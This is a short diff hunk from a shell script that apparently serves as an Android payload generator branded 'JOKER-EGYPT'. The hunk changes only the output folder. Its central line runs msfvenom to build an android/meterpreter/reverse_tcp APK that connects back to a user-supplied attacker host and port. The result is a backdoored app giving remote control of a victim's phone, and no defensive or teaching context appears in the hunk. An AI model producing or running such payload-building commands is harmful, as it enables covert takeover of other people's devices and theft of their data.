@@ -21,7 +21,7 @@ read -p "Enter Name ~: " name
 echo -e "$g"
 mkdir /sdcard/JOKER-EGYPT
 clear
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R >  /sdcard/payload/$name.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R >  /sdcard/JOKER-EGYPT/$name.apk
 clear
 echo "  $y    Saved payload /sdcard/JOKER-EGYPT/$g"
 read -p "Enter BaCk ..."
